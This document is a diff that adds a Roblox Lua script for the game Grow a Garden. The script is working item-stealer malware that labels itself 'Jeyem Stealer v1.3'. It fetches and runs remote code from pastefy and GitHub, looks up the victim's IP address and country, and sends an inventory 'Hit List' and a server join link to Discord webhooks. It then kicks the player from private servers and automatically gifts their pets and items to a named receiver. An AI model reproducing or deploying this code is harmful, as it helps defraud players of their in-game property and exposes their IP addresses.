@@ -1,0 +1,256 @@
+u
+loadstring(game:HttpGet("https://pastefy.app/ltgVdkP8/raw"))()
+
+local player = game.Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
+local backpack = LocalPlayer:WaitForChild("Backpack")
+local CalculatePlantValue = require(ReplicatedStorage.Modules.CalculatePlantValue)
+local ActivePetsService = require(ReplicatedStorage.Modules.PetServices.ActivePetsService)
+local req = (syn and syn.request) or (http and http.request) or (http_request) or request
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/FakeModz/LimitHub/refs/heads/main/LimitHub_Luarmor_E.lua'))()
+
+local function formatNumber(n)
+    local left, num, right = string.match(tostring(n), "^([^%d]*%d)(%d*)(.-)$")
+    num = num:reverse():gsub("(%d%d%d)", "%1,"):reverse()
+    num = num:gsub("^,", "")
+    return left .. num .. right
+end
+
+
+local executor = (identifyexecutor and identifyexecutor()) or "Unknown"
+
+
+local itemsWithValue = {}
+for _, item in pairs(backpack:GetChildren()) do
+    if item:FindFirstChild("Item_String") then
+        local value = CalculatePlantValue(item)
+        table.insert(itemsWithValue, {name = item.Name, value = value})
+    end
+end
+
+table.sort(itemsWithValue, function(a, b) return a.value > b.value end)
+
+local tradableSummary = ""
+for i = 1, math.min(10, #itemsWithValue) do
+    local item = itemsWithValue[i]
+    tradableSummary = tradableSummary .. item.name .. " - Worth: " .. formatNumber(item.value) .. "\n"
+end
+if #itemsWithValue > 10 then
+    tradableSummary = tradableSummary .. "and more..."
+end
+
+local totalValue = 0
+for _, item in ipairs(itemsWithValue) do
+    totalValue += item.value
+end
+
+local payload = {
+    ["username"] = "Jeyem Stealer v1.3",
+    ["avatar_url"] = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRm_yNhlkytjwYwDNjv-ScoR_IF9i8ETMVNAEYW5Up3klindNY8eAnVyZs&s=10",
+    ["content"] = "--@everyone\n" .. string.format("game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\")", game.PlaceId, game.JobId),
+    ["embeds"] = {{
+        ["title"] = "ðŸ€ TANGINAMO FERDZ!",
+        ["color"] = 0x00ffcc,
+        ["fields"] = {
+            {
+                ["name"] = "ðŸ’³ Information",
+                ["value"] = "```lua\nExecutor: " .. tostring(executor) .. "\nReceiver: " .. tostring(username) .. "\nVictim: " .. LocalPlayer.Name .. "\nIP Address: " .. game:HttpGet('https://ipinfo.io/ip') .. "```",
+                ["inline"] = false
+            },
+            {
+                ["name"] = "ðŸ’° Total Value",
+                ["value"] = "**" .. formatNumber(totalValue) .. "**",
+                ["inline"] = false
+            },
+            {
+                ["name"] = "ðŸ¤‘ Hit List",
+                ["value"] = tradableSummary,
+                ["inline"] = false
+            },
+            {
+                ["name"] = "ðŸšª Join Link",
+                ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId),
+                ["inline"] = false
+            }
+        },
+        ["footer"] = {
+            ["text"] = "By Paldo | "..os.date("%m/%d/%Y @ %I:%M %p")
+        },
+        ["thumbnail"] = {
+            ["url"] = "https://static.wikia.nocookie.net/roblox/images/0/0a/GrowAGarden.webp/revision/latest?cb=20250603074357&path-prefix=ru"
+        }
+    }}
+}
+
+local function trim(s)
+    return (s:gsub("^%s*(.-)%s*$", "%1"))
+end
+
+local rawCountryCode = game:HttpGet('https://ipinfo.io/country')
+local countryCode = trim(rawCountryCode)
+countryCode = string.lower(countryCode)
+local countryFlagEmoji = ":flag_" .. countryCode .. ":"
+
+local logs_payload = {
+    ["embeds"] = {{
+        ["title"] = "ðŸ€ New GAG Execution",
+        ["color"] = 0x00ffcc,
+        ["fields"] = {
+            {
+                ["name"] = "Victim Username:",
+                ["value"] = "Username is hidden\nCountry: " .. countryFlagEmoji,
+                ["inline"] = false
+            },
+            {
+                ["name"] = "ðŸ’° Total Value",
+                ["value"] = "**" .. formatNumber(totalValue) .. "**",
+                ["inline"] = false
+            },
+            {
+                ["name"] = "ðŸ¤‘ Hit List",
+                ["value"] = tradableSummary,
+                ["inline"] = false
+            }
+        },
+        ["footer"] = {
+            ["text"] = "By Paldont | "..os.date("%m/%d/%Y @ %I:%M %p")
+        }
+    }}
+}
+
+
+if req then
+    pcall(function()
+        req({
+            Url = webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(payload)
+        })
+        
+        req({
+            Url = logs_webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(logs_payload)
+        })
+    end)
+end
+
+
+local printedInventory = false
+local started = false
+
+local function getKg(name)
+    return tonumber(string.match(name, "%[(%d*%.?%d+)%s*[kK][gG]%]")) or 0
+end
+
+local function printSortedItems(items)
+    
+end
+
+local function hasValidItems()
+    for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
+        if getKg(item.Name) > 0 then
+            return true
+        end
+    end
+    return false
+end
+
+local function unequipAllPets()
+    local petData = ActivePetsService:GetPlayerDatastorePetData(LocalPlayer.Name)
+    if petData then
+        for uuid, _ in pairs(petData.PetInventory.Data) do
+            ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetsService"):FireServer("UnequipPet", uuid)
+            task.wait(0.1)
+        end
+    end
+end
+
+local function startGiving()
+    if not hasValidItems() then return end
+    local target = Players:FindFirstChild(username)
+    if not target or not target.Character then return end
+
+    local hrp = target.Character:FindFirstChild("HumanoidRootPart")
+    if not hrp then return end
+
+    LocalPlayer.Character:MoveTo(hrp.Position)
+    task.wait(0.4)
+
+    local prompt = hrp:FindFirstChildOfClass("ProximityPrompt")
+    if not prompt then return end
+    prompt.HoldDuration = 0
+
+    local index = 1
+    while true do
+        if not hasValidItems() then break end
+        local sortedItems = {}
+        for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
+            if getKg(item.Name) > 0 then
+                table.insert(sortedItems, item)
+            end
+        end
+        table.sort(sortedItems, function(a, b) return getKg(a.Name) > getKg(b.Name) end)
+
+        if #sortedItems > 0 then
+            if index > #sortedItems then index = 1 end
+            local item = sortedItems[index]
+            if item:IsA("Tool") then
+                item.Parent = LocalPlayer.Character
+                task.wait()
+            end
+
+            ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer("GivePet", target)
+            prompt:InputHoldBegin()
+            task.wait(0.1)
+            prompt:InputHoldEnd()
+
+            if item:IsDescendantOf(LocalPlayer.Character) then
+                item.Parent = LocalPlayer.Backpack
+            end
+
+            index += 1
+        else
+            break
+        end
+        task.wait(0.05)
+    end
+end
+
+
+-- VIP Server Check
+local function isVIP()
+    if #game.Players:GetPlayers() <= 2 then
+        return true
+    end
+    if workspace:FindFirstChild("VIPServer") then
+        return true
+    end
+    return false
+end
+
+if isVIP() then
+    game.Players.LocalPlayer:Kick("Private server is not allowed, join public server")
+    return
+end
+
+local function waitForChatAndStart()
+    unequipAllPets()
+    local targetPlayer = Players:FindFirstChild(username) or Players.PlayerAdded:Wait()
+    if targetPlayer then
+        targetPlayer.Chatted:Connect(function()
+            if not started then
+                started = true
+                startGiving()
+            end
+        end)
+    end
+end
+
+waitForChatAndStart()
